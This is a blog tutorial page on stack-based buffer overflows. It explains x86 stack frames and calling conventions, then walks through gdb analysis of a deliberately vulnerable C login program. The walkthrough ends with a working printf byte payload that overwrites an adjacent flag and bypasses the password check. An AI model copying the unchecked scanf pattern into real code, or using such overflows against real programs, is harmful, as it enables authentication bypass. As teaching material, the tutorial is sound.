<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Stack Based Buffer Overflow Attacks | Sanketh's Blog</title><meta name=keywords content="vulnerabilities,buffer overflow,reverse engineering"><meta name=description content="Stack Based Buffer Overflow Attacks
A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C
When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><meta name=author content="Sanketh"><link rel=canonical href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.deee627d8b8d9065acc54b2c9d901e601e142335047d242a93ba7bce86f41f19.css integrity="sha256-3u5ifYuNkGWsxUssnZAeYB4UIzUEfSQqk7p7zob0Hxk=" rel="preload stylesheet" as=style><link rel=icon href=https://sankethbk.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sankethbk.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sankethbk.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://sankethbk.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://sankethbk.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"><meta property="og:site_name" content="Sanketh's Blog"><meta property="og:title" content="Stack Based Buffer Overflow Attacks"><meta property="og:description" content="Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-11T00:00:00+00:00"><meta property="article:tag" content="Vulnerabilities"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Stack Based Buffer Overflow Attacks"><meta name=twitter:description content="Stack Based Buffer Overflow Attacks
A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C
When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://sankethbk.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Stack Based Buffer Overflow Attacks","item":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Stack Based Buffer Overflow Attacks","name":"Stack Based Buffer Overflow Attacks","description":"Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).\nCauses of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:\n","keywords":["vulnerabilities","buffer overflow","reverse engineering"],"articleBody":"Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).\nCauses of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:\n1. C allows writing beyond (and before) array bounds Arrays in C are just raw memory. The compiler does not perform runtime checks. If you write past buf[63], C simply writes into whatever memory comes next. char buf[64]; buf[100] = 'A'; // C happily writes here → overflow No warning, no crash, memory is overwritten silently.\n2. C strings rely on null termination C treats strings as a sequence of characters until it encounters a null termination character \\0\nProblems caused by this:\nFunctions like strcpy, gets, scanf(\"%s\") keep copying until they hit a null byte — not until the buffer ends. If input lacks a null terminator early enough, it will overflow. 3. Direct pointer arithmetic C allows writing to any address you compute.\n*(buf + 80) = 'X'; Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.\nWhat is Stack? Stack is a segment of memory where the process stores function context: particularly function calls and its local variables.\nBefore Stack, programmers didn’t have a definite way of doing these things:\nWhere to store function arguments Where to store local variables Where to store the return address (so CPU knows where to go back) How to make function calls nested (A → B → C → D …) How to handle recursion (function calling itself multiple times) Some of the earlier assembly languages didn’t have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU’s have support for stack at the hardware level.\nWhy a stack specifically (LIFO)? Function calls behave naturally like a Last-In-First-Out structure.\nExample:\nmain calls A A calls B B calls C Order of returning:\nC returns to B B returns to A A returns to main This is literally a LIFO pattern, a stack is the perfect structure.\nStructure of a Stack Frame A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.\nRegister Management in x86:\nThe EBP (Base Pointer) register marks the base of the currently active stack frame The ESP (Stack Pointer) register points to the top of the stack The Reality of Function Calls:\nWhile high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of “functions”—each function call is simply a jump to a different memory location containing executable instructions.\nThis creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed?\nThe Application Binary Interface (ABI):\nThe solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:\nHow arguments are passed (registers vs. stack) Which registers are preserved across calls Where return values are stored How the stack frame is set up and torn down Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.\nLet’s take an example\nint main() { A(5); } void A(int a) { B(3); } void B(int b) { int local_var1; char local_var2; } The stack for this code when C is called will look like this:\nHigher Memory Addresses (0xFFFFFFFF) ↑ | | STACK GROWTH DIRECTION | ↓↓↓ | +------------------+ | Arguments | ← Arguments for function A (if any) | for A | +------------------+ | Return Addr | ← Where to return after A finishes (e.g., main) | to main | +------------------+ | Saved EBP | ← main's base pointer | (main's frame) | +------------------+ ← EBP when A is executing (A's frame base) | A's Local | | Variables | | - local_var1 | | - local_var2 | +------------------+ | Arguments | ← Arguments pushed for B (right to left in C) | for B | e.g., arg2, arg1 +------------------+ | Return Addr | ← Where to return in A after B finishes | to A | +------------------+ | Saved EBP | ← A's base pointer saved | (A's frame) | +------------------+ ← EBP (Current frame base - B is executing) | B's Local | | Variables | | - local_var1 | | - local_var2 | +------------------+ ← ESP (Stack pointer - top of stack) | | | (Unused | | Stack | | Space) | | | ↓ Lower Memory Addresses (0x00000000) What Happens During a Function Call Now let’s look at thx86 assembly code for what happens when a function is called\n1. Caller’s Responsibilities (Before the Jump): First, the caller must save the return address—the location where execution should resume after the function completes. Let’s see what happens when function A calls function B.\npush arguments_to_function_B (pushed in reverse order) push next_instruction_address_of_function_A (the value in EIP register) jmp address_of_function_B Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller.\n; Function A calling Function B with register preservation function_A: ; ... A's code using registers ... mov eax, 100 ; EAX has important data mov ebx, 200 ; EBX has important data mov ecx, 300 ; ECX has important data ; Prepare to call B pusha ; Push all general-purpose registers onto stack ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI push arguments_to_function_B ; (pushed in reverse order) push next_instruction_address_of_function_A ; (the value in EIP register) jmp address_of_function_B popa ; Restore all registers to their original values ; Now EAX=100, EBX=200, ECX=300 again ; Continue with A's logic, registers are preserved ; ... Most of the times callee’s ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.\n2. Callee’s Responsibilities (Function Prologue): Once inside the function B, we need to set up a new stack frame:\naddress_of_function_B: push ebp ; Save the old base pointer (of function A) mov ebp, esp ; Set EBP to current stack top (new frame base) sub esp, N ; Allocate space for local variables (N bytes) This sequence accomplishes three things:\nPreserves the caller’s frame pointer (old EBP) so we can restore it late Establishes a new base pointer for the current function Allocates stack space for local variables by moving ESP downward 3. Function Execution: The function body executes, with local variables accessible via offsets from EBP:\n[ebp-4] accesses the first local variable [ebp-8] accesses the second, and so on Function parameters (if pushed by caller) are at [ebp+8], [ebp+12], etc. 4. Callee’s Responsibilities (Function Epilogue): Before returning, we must tear down the stack frame and restore state:\nmov esp, ebp ; Deallocate local variables (restore ESP) pop ebp ; Restore the old base pointer ret_address = pop() ; Get return address from stack jmp ret_address ; Jump back to caller This will:\nCollapses the function B’s stack frame by resetting ESP to EBP Restores the caller’s base pointer Retrieves the return address from the stack (saved by function A) Jumps back to continue execution after the original call site Simplified Function Call with CALL/RET/LEAVE The x86 instruction set provides three specialized instructions that automate this process:\nThe CALL Instruction: call function_address This single instruction replaces:\npush next_instruction_address jmp function_address It automatically pushes the return address (address of the instruction following call) onto the stack and jumps to the target function.\nThe LEAVE Instruction: leave This single instruction replaces:\nmov esp, ebp pop ebp It efficiently collapses the stack frame and restores the old base pointer in one operation.\nThe RET Instruction: ret This single instruction replaces:\npop eip ; Pop return address into instruction pointer jmp eip ; Jump to return address Complete Example with Simplified Instructions: ; Caller side: push argument2 push argument1 call my_function ; Pushes return address and jumps add esp, 8 ; Clean up arguments (caller cleanup) ; Callee side: my_function: push ebp ; Save old frame pointer mov ebp, esp ; Set up new frame sub esp, 16 ; Allocate local variables ; ... function body ... leave ; Equivalent to: mov esp, ebp; pop ebp ret ; Pop return address and jump to it Buffer OverFlow Attacks 1. Overflowing a Variable On Stack Consider this C program\n#include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { int isAuthenticated = 0; char password[8]; printf(\"Enter password: \"); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } This is the normal working of the program\n$ gcc main.c $ ./a.out Enter password: password Authentication Failed $ ./a.out Enter password: admin123 Access Granted What if we don’t know the correct password? Can we still gain access?\nThe vulnerability lies in scanf(\"%s\", password); which performs no bounds checking. This allows us to write more than 8 bytes into the password buffer, potentially overwriting adjacent stack variables—specifically, the isAuthenticated variable.\nStack layout when AuthenticateUser() is executing:\nHigher Addresses +-------------------------+ | Saved return address | ← Return address to main() +-------------------------+ | Saved RBP | ← Previous stack frame base +-------------------------+ ← RBP (current frame base) | isAuthenticated (4 bytes) | ← [RBP-4] +-------------------------+ | padding (if any) | +-------------------------+ | password[8] | ← [RBP-12] (buffer starts here) +-------------------------+ ← RSP (stack pointer) Lower Addresses Now let’s compile another version of the code known as vuln\n$ gcc -fno-stack-protector -O0 -o vuln main.c Why -fno-stack-protector?\nThe -fno-stack-protector flag disables GCC’s Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.\nThe Stack Guard’s main feature is stack canary - although the existence of stsck canary doesn’t stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that isAuthenticated appears after password, so we would never be able to rewrite the password.\n-O0 will disable all compiler optimizations, so we can see all the assembly code.\nLet’s start by printing the disassembly of the key functions\n(gdb) disass AuthenticateUser Dump of assembler code for function AuthenticateUser: 0x00000000000011fe \u003c+0\u003e:\tendbr64 0x0000000000001202 \u003c+4\u003e:\tpush rbp 0x0000000000001203 \u003c+5\u003e:\tmov rbp,rsp 0x0000000000001206 \u003c+8\u003e:\tsub rsp,0x10 0x000000000000120a \u003c+12\u003e:\tmov DWORD PTR [rbp-0x4],0x0 0x0000000000001211 \u003c+19\u003e:\tlea rax,[rip+0xe04] # 0x201c 0x0000000000001218 \u003c+26\u003e:\tmov rdi,rax 0x000000000000121b \u003c+29\u003e:\tmov eax,0x0 0x0000000000001220 \u003c+34\u003e:\tcall 0x1090 0x0000000000001225 \u003c+39\u003e:\tlea rax,[rbp-0xc] 0x0000000000001229 \u003c+43\u003e:\tmov rsi,rax 0x000000000000122c \u003c+46\u003e:\tlea rax,[rip+0xdfa] # 0x202d 0x0000000000001233 \u003c+53\u003e:\tmov rdi,rax 0x0000000000001236 \u003c+56\u003e:\tmov eax,0x0 0x000000000000123b \u003c+61\u003e:\tcall 0x10b0 \u003c__isoc99_scanf@plt\u003e 0x0000000000001240 \u003c+66\u003e:\tlea rdx,[rbp-0x4] 0x0000000000001244 \u003c+70\u003e:\tlea rax,[rbp-0xc] 0x0000000000001248 \u003c+74\u003e:\tmov rsi,rdx 0x000000000000124b \u003c+77\u003e:\tmov rdi,rax 0x000000000000124e \u003c+80\u003e:\tcall 0x11c3 0x0000000000001253 \u003c+85\u003e:\tmov eax,DWORD PTR [rbp-0x4] 0x0000000000001256 \u003c+88\u003e:\tcmp eax,0x1 0x0000000000001259 \u003c+91\u003e:\tjne 0x1267 0x000000000000125b \u003c+93\u003e:\tmov eax,0x0 0x0000000000001260 \u003c+98\u003e:\tcall 0x11a9 0x0000000000001265 \u003c+103\u003e:\tjmp 0x1276 0x0000000000001267 \u003c+105\u003e:\tlea rax,[rip+0xdc2] # 0x2030 0x000000000000126e \u003c+112\u003e:\tmov rdi,rax 0x0000000000001271 \u003c+115\u003e:\tcall 0x1080 0x0000000000001276 \u003c+120\u003e:\tnop 0x0000000000001277 \u003c+121\u003e:\tleave 0x0000000000001278 \u003c+122\u003e:\tret End of assembler dump. (gdb) disass checkPassword Dump of assembler code for function checkPassword: 0x00000000000011c3 \u003c+0\u003e:\tendbr64 0x00000000000011c7 \u003c+4\u003e:\tpush rbp 0x00000000000011c8 \u003c+5\u003e:\tmov rbp,rsp 0x00000000000011cb \u003c+8\u003e:\tsub rsp,0x10 0x00000000000011cf \u003c+12\u003e:\tmov QWORD PTR [rbp-0x8],rdi 0x00000000000011d3 \u003c+16\u003e:\tmov QWORD PTR [rbp-0x10],rsi 0x00000000000011d7 \u003c+20\u003e:\tmov rax,QWORD PTR [rbp-0x8] 0x00000000000011db \u003c+24\u003e:\tlea rdx,[rip+0xe31] # 0x2013 0x00000000000011e2 \u003c+31\u003e:\tmov rsi,rdx 0x00000000000011e5 \u003c+34\u003e:\tmov rdi,rax 0x00000000000011e8 \u003c+37\u003e:\tcall 0x10a0 0x00000000000011ed \u003c+42\u003e:\ttest eax,eax 0x00000000000011ef \u003c+44\u003e:\tjne 0x11fb 0x00000000000011f1 \u003c+46\u003e:\tmov rax,QWORD PTR [rbp-0x10] 0x00000000000011f5 \u003c+50\u003e:\tmov DWORD PTR [rax],0x1 0x00000000000011fb \u003c+56\u003e:\tnop 0x00000000000011fc \u003c+57\u003e:\tleave 0x00000000000011fd \u003c+58\u003e:\tret End of assembler dump. By looking at the assembly of AuthenticateUser we can pinpoint where isAuthenticated and password are located on stack.\nisAuthenticated at [rbp-0x4] 0x120a \u003c+12\u003e: mov DWORD PTR [rbp-0x4],0x0 this is writing 0 to the address [rbp-0x4], which is equivalent to the C code\nint isAuthenticated = 0; // Initialize to 0 password is at [rbp-0xc] We can just figure it out by looking at the arguments passed to checkPassword\n0x1240 \u003c+66\u003e: lea rdx,[rbp-0x4] ; Load address of [rbp-0x4] 0x1244 \u003c+70\u003e: lea rax,[rbp-0xc] ; Load address of [rbp-0xc] 0x1248 \u003c+74\u003e: mov rsi,rdx ; 2nd arg: \u0026isAuthenticated 0x124b \u003c+77\u003e: mov rdi,rax ; 1st arg: password 0x124e \u003c+80\u003e: call 0x11c3 We know rdi contains first password and rsi contains second, from C code we can see first parameter is password and second parameter is isAuthenticated.\nNow let’s place a breakpoint right before this code\nif (isAuthenticated == 1) { We can spot the corresponding cmp assembly operation here\n0x000000000000124e \u003c+80\u003e:\tcall 0x11c3 0x0000000000001253 \u003c+85\u003e:\tmov eax,DWORD PTR [rbp-0x4] 0x0000000000001256 \u003c+88\u003e:\tcmp eax,0x1 0x0000000000001259 \u003c+91\u003e:\tjne 0x1267 0x000000000000125b \u003c+93\u003e:\tmov eax,0x0 0x0000000000001260 \u003c+98\u003e:\tcall 0x11a9 0x0000000000001265 \u003c+103\u003e:\tjmp 0x1276 Note that b *0x0000000000001256 won’t work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this\n(gdb) break *AuthenticateUser+88 Breakpoint 4 at 0x555555555256 GDB allows this since the relative offsets will same and it is aware of the symbols.\nNow let’s enter the password\n(gdb) c Continuing. Enter password: AAAAAAAA1 Breakpoint 4, 0x0000555555555256 in AuthenticateUser () AAAAAAAA1 is 9 bytes, just 1 byte more than password. Let’s inspect the memory to confirm if the overflow happened.\n(gdb) x/12xb $rbp - 0xc 0x7fffffffddf4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41 0x7fffffffddfc:\t0x31\t0x00\t0x00\t0x00 (gdb) x/1dw $rbp - 0x4 0x7fffffffddfc:\t49 Recall that $rbp - 0xc is the address of password and $rbp - 0x4 is the address of isAuthenticated.\nIn first command we are printing 12 bytes from 0x7fffffffddf4 we can see 9th byte is 0x31 which is the ascii value of 1 we entered at the end.\nBut since the value stored is not 0x01 we can see the value of isAuthenticated is not 49 which will still fail the check.\n(gdb) c Continuing. Authentication Failed [Inferior 1 (process 8454) exited normally] Now we know that overflow actually works, we can actually try to voerwrite 0x01 into the address of isAuthenticated. This is the scenario we are hoping for\n0x7fffffffddf4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41 0x7fffffffddfc:\t0x01\t0x00\t0x00\t0x00 Note that the bytes 0x01\t0x00\t0x00\t0x00 appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.\nThe problem is the character whose ascii value is 0x01 is actually a non-printable character which means we can’t type it into the terminal.\nBut we can pass raw byte stream using utilities like printf and pipe its output to our program\n$ printf 'AAAAAAAA\\x01' | ./vuln Enter password: Access Granted This proves that the overwrite worked in an expected way!\n","wordCount":"2599","inLanguage":"en","datePublished":"2025-11-11T00:00:00Z","dateModified":"2025-11-11T00:00:00Z","author":{"@type":"Person","name":"Sanketh"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"},"publisher":{"@type":"Organization","name":"Sanketh's Blog","logo":{"@type":"ImageObject","url":"https://sankethbk.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sankethbk.github.io/blog/ accesskey=h title="Sanketh's Blog (Alt + H)">Sanketh's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Stack Based Buffer Overflow Attacks</h1><div class=post-meta><span title='2025-11-11 00:00:00 +0000 UTC'>November 11, 2025</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Sanketh&nbsp;|&nbsp;<a href=https://github.com/SankethBK/blog/edit/main/content/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#stack-based-buffer-overflow-attacks aria-label="Stack Based Buffer Overflow Attacks">Stack Based Buffer Overflow Attacks</a><ul><li><a href=#causes-of-buffer-overflow-attacks-in-c aria-label="Causes of Buffer Overflow Attacks in C">Causes of Buffer Overflow Attacks in C</a><ul><li><a href=#1-c-allows-writing-beyond-and-before-array-bounds aria-label="1. C allows writing beyond (and before) array bounds">1. C allows writing beyond (and before) array bounds</a></li><li><a href=#2-c-strings-rely-on-null-termination aria-label="2. C strings rely on null termination">2. C strings rely on null termination</a></li><li><a href=#3-direct-pointer-arithmetic aria-label="3. Direct pointer arithmetic">3. Direct pointer arithmetic</a></li></ul></li><li><a href=#what-is-stack aria-label="What is Stack?">What is Stack?</a><ul><li><a href=#why-a-stack-specifically-lifo aria-label="Why a stack specifically (LIFO)?">Why a stack specifically (LIFO)?</a></li><li><a href=#structure-of-a-stack-frame aria-label="Structure of a Stack Frame">Structure of a Stack Frame</a></li><li><a href=#what-happens-during-a-function-call aria-label="What Happens During a Function Call">What Happens During a Function Call</a><ul><li><a href=#1-callers-responsibilities-before-the-jump aria-label="1. Caller&rsquo;s Responsibilities (Before the Jump):">1. Caller&rsquo;s Responsibilities (Before the Jump):</a></li><li><a href=#2-callees-responsibilities-function-prologue aria-label="2. Callee&rsquo;s Responsibilities (Function Prologue):">2. Callee&rsquo;s Responsibilities (Function Prologue):</a></li><li><a href=#3-function-execution aria-label="3. Function Execution:">3. Function Execution:</a></li><li><a href=#4-callees-responsibilities-function-epilogue aria-label="4. Callee&rsquo;s Responsibilities (Function Epilogue):">4. Callee&rsquo;s Responsibilities (Function Epilogue):</a></li></ul></li><li><a href=#simplified-function-call-with-callretleave aria-label="Simplified Function Call with CALL/RET/LEAVE">Simplified Function Call with CALL/RET/LEAVE</a><ul><li><a href=#the-call-instruction aria-label="The CALL Instruction:">The CALL Instruction:</a></li><li><a href=#the-leave-instruction aria-label="The LEAVE Instruction:">The LEAVE Instruction:</a></li><li><a href=#the-ret-instruction aria-label="The RET Instruction:">The RET Instruction:</a></li><li><a href=#complete-example-with-simplified-instructions aria-label="Complete Example with Simplified Instructions:">Complete Example with Simplified Instructions:</a></li></ul></li></ul></li><li><a href=#buffer-overflow-attacks aria-label="Buffer OverFlow Attacks">Buffer OverFlow Attacks</a><ul><li><a href=#1-overflowing-a-variable-on-stack aria-label="1. Overflowing a Variable On Stack">1. Overflowing a Variable On Stack</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=stack-based-buffer-overflow-attacks>Stack Based Buffer Overflow Attacks<a hidden class=anchor aria-hidden=true href=#stack-based-buffer-overflow-attacks>#</a></h1><p>A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).</p><h2 id=causes-of-buffer-overflow-attacks-in-c>Causes of Buffer Overflow Attacks in C<a hidden class=anchor aria-hidden=true href=#causes-of-buffer-overflow-attacks-in-c>#</a></h2><p>When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:</p><h3 id=1-c-allows-writing-beyond-and-before-array-bounds>1. C allows writing beyond (and before) array bounds<a hidden class=anchor aria-hidden=true href=#1-c-allows-writing-beyond-and-before-array-bounds>#</a></h3><ul><li>Arrays in C are just raw memory.</li><li>The compiler does not perform runtime checks.</li><li>If you write past <code>buf[63]</code>, C simply writes into whatever memory comes next.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>64</span>];
</span></span><span style=display:flex><span>buf[<span style=color:#ae81ff>100</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;A&#39;</span>;   <span style=color:#75715e>// C happily writes here → overflow
</span></span></span></code></pre></div><p>No warning, no crash, memory is overwritten silently.</p><h3 id=2-c-strings-rely-on-null-termination>2. C strings rely on null termination<a hidden class=anchor aria-hidden=true href=#2-c-strings-rely-on-null-termination>#</a></h3><p>C treats strings as a sequence of characters until it encounters a null termination character <code>\0</code></p><p>Problems caused by this:</p><ul><li>Functions like <code>strcpy</code>, <code>gets</code>, <code>scanf("%s")</code> keep copying until they hit a null byte — not until the buffer ends.</li><li>If input lacks a null terminator early enough, it will overflow.</li></ul><h3 id=3-direct-pointer-arithmetic>3. Direct pointer arithmetic<a hidden class=anchor aria-hidden=true href=#3-direct-pointer-arithmetic>#</a></h3><p>C allows writing to any address you compute.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#f92672>*</span>(buf <span style=color:#f92672>+</span> <span style=color:#ae81ff>80</span>) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;X&#39;</span>;
</span></span></code></pre></div><p>Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.</p><h2 id=what-is-stack>What is Stack?<a hidden class=anchor aria-hidden=true href=#what-is-stack>#</a></h2><p>Stack is a segment of memory where the process stores function context: particularly function calls and its local variables.</p><p>Before Stack, programmers didn&rsquo;t have a definite way of doing these things:</p><ul><li>Where to store function arguments</li><li>Where to store local variables</li><li>Where to store the return address (so CPU knows where to go back)</li><li>How to make function calls nested (A → B → C → D …)</li><li>How to handle recursion (function calling itself multiple times)</li></ul><p>Some of the earlier assembly languages didn&rsquo;t have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU&rsquo;s have support for stack at the hardware level.</p><h3 id=why-a-stack-specifically-lifo>Why a stack specifically (LIFO)?<a hidden class=anchor aria-hidden=true href=#why-a-stack-specifically-lifo>#</a></h3><p>Function calls behave naturally like a Last-In-First-Out structure.</p><p>Example:</p><pre tabindex=0><code>main calls A
A calls B
B calls C
</code></pre><p>Order of returning:</p><pre tabindex=0><code>C returns to B
B returns to A
A returns to main
</code></pre><p>This is literally a LIFO pattern, a stack is the perfect structure.</p><h3 id=structure-of-a-stack-frame>Structure of a Stack Frame<a hidden class=anchor aria-hidden=true href=#structure-of-a-stack-frame>#</a></h3><p>A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.</p><p><strong>Register Management in x86:</strong></p><ul><li>The <strong>EBP (Base Pointer)</strong> register marks the base of the currently active stack frame</li><li>The <strong>ESP (Stack Pointer)</strong> register points to the top of the stack</li></ul><p><strong>The Reality of Function Calls:</strong></p><p>While high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of &ldquo;functions&rdquo;—each function call is simply a jump to a different memory location containing executable instructions.</p><p>This creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed?</p><p><strong>The Application Binary Interface (ABI):</strong></p><p>The solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:</p><ul><li>How arguments are passed (registers vs. stack)</li><li>Which registers are preserved across calls</li><li>Where return values are stored</li><li>How the stack frame is set up and torn down</li></ul><p>Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.</p><p>Let&rsquo;s take an example</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>A</span>(<span style=color:#ae81ff>5</span>);
</span></span><span style=display:flex><span>}
